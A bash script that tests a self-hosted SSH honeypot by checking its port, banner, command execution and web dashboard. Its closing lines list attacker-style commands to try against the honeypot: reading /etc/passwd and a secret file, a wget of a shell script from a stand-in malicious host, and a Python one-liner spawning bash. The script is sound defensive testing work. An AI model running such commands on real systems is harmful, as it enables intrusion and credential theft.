#!/bin/bash
# ══════════════════════════════════════════════════════════════════════════════
# test-ssh-connection.sh
# Test script for verifying the SSH Honeypot is working correctly.
# Run this from a different terminal or machine.
# ══════════════════════════════════════════════════════════════════════════════

HONEYPOT_HOST="${1:-localhost}"
HONEYPOT_PORT="${2:-2222}"
HONEYPOT_USER="${3:-admin}"
HONEYPOT_PASS="${4:-password}"

echo "SSH Honeypot - Connection Test Script"
echo "======================================"
echo "Target: ${HONEYPOT_HOST}:${HONEYPOT_PORT}"
echo "User:   ${HONEYPOT_USER}"
echo ""

# Test 1: Basic connectivity
echo "[Test 1] Checking port reachability..."
if nc -z -w 3 "${HONEYPOT_HOST}" "${HONEYPOT_PORT}" 2>/dev/null; then
    echo "  ✓ Port ${HONEYPOT_PORT} is open"
else
    echo "  ✗ Port ${HONEYPOT_PORT} is not reachable"
    echo "  Check: Is the honeypot running? Is the port exposed?"
    exit 1
fi

# Test 2: SSH banner
echo "[Test 2] Checking SSH banner..."
BANNER=$(timeout 3 ssh -o "StrictHostKeyChecking=no" \
    -o "ConnectTimeout=3" \
    -o "BatchMode=yes" \
    -p "${HONEYPOT_PORT}" \
    "${HONEYPOT_USER}@${HONEYPOT_HOST}" \
    "echo CONNECTED" 2>&1 | head -5)
if echo "${BANNER}" | grep -q "OpenSSH"; then
    echo "  ✓ SSH banner detected: $(echo "${BANNER}" | grep OpenSSH)"
else
    echo "  ~ Banner check inconclusive (may be auth error - normal for honeypot)"
fi

# Test 3: Command execution
echo "[Test 3] Executing test commands..."
if command -v sshpass &>/dev/null; then
    OUTPUT=$(sshpass -p "${HONEYPOT_PASS}" ssh \
        -o "StrictHostKeyChecking=no" \
        -o "ConnectTimeout=5" \
        -p "${HONEYPOT_PORT}" \
        "${HONEYPOT_USER}@${HONEYPOT_HOST}" \
        "whoami; hostname; ls /home" 2>/dev/null)
    if [ -n "${OUTPUT}" ]; then
        echo "  ✓ Commands executing:"
        echo "${OUTPUT}" | sed 's/^/    /'
    else
        echo "  ! No output - check if honeypot is running in open mode (--open)"
    fi
else
    echo "  ~ sshpass not found. Install it to run command tests:"
    echo "    sudo apt install sshpass"
    echo "  Manual test: ssh -p ${HONEYPOT_PORT} ${HONEYPOT_USER}@${HONEYPOT_HOST}"
fi

# Test 4: Dashboard
echo "[Test 4] Checking web dashboard..."
if command -v curl &>/dev/null; then
    DASHBOARD_PORT="${5:-5000}"
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        --max-time 3 "http://${HONEYPOT_HOST}:${DASHBOARD_PORT}/" 2>/dev/null)
    if [ "${HTTP_CODE}" = "200" ]; then
        echo "  ✓ Dashboard accessible at http://${HONEYPOT_HOST}:${DASHBOARD_PORT}/"
    else
        echo "  ! Dashboard returned HTTP ${HTTP_CODE}"
        echo "  Check: Is --dashboard flag passed? Is port 5000 exposed?"
    fi
fi

echo ""
echo "Test complete. To connect manually:"
echo "  ssh -p ${HONEYPOT_PORT} ${HONEYPOT_USER}@${HONEYPOT_HOST}"
echo ""
echo "To run a threat detection test (try these commands after connecting):"
echo "  cat /etc/passwd"
echo "  wget http://malicious.example.com/shell.sh"
echo "  cat /home/corpuser/secret.txt"
echo "  python3 -c 'import os; os.system(\"bash -i\")'"
